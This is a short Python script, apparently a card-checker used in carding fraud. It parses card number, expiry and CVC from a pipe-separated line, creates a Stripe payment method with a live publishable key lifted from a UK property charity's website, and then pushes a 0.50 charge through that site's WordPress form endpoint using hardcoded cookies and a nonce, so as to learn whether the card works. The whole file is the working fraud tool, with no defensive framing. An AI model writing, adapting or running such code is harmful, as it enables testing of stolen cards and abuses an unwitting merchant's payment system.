import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc9c125eeb4%3B+stripe-js-v3%2Fc9c125eeb4%3B+card-element&referrer=https%3A%2F%2Fhgpropertiescic.co.uk&time_on_page=20464&key=pk_live_51PxqvoHTdayY2gFMLSzdpQVyeQupIeWUPUngPZ13BFswhl4OWLnbexqCF7CDf4R3DHK8UCgOmzeCL75jrd4MlPPA00QPJTFkAZ'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': '7d913f64-2318-496d-9891-e4e0425efd814b7722',
	    '__stripe_sid': '5d38d6d8-c235-4b59-b39b-a604572a70cacf42ab',
	}
	
	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'Cookie': '__stripe_mid=7d913f64-2318-496d-9891-e4e0425efd814b7722; __stripe_sid=5d38d6d8-c235-4b59-b39b-a604572a70cacf42ab',
	    'Origin': 'https://hgpropertiescic.co.uk',
	    'Referer': 'https://hgpropertiescic.co.uk/payment/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	params = {
	    't': '1737367312013',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=742&_fluentform_3_fluentformnonce=b333f76250&_wp_http_referer=%2Fpayment%2F&custom-payment-amount=0.50&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '3',
	}
	
	r2 = requests.post(
	    'https://hgpropertiescic.co.uk/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
